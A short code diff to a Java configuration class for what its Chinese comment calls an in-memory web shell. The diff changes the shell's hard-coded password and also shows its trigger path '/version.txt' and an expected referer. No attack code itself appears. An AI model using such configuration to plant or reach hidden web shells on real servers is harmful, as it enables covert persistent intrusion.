@@ -37,7 +37,7 @@ public class Config {
 	public static String URL_PATTERN = "/version.txt";
 
 	// 内存马的密码
-	public static String PASSWORD = "f359740bd1cda994";
+	public static String PASSWORD = "0f359740bd1cda99";
 
 	public static String REFERER = "https://su18.org/";
 
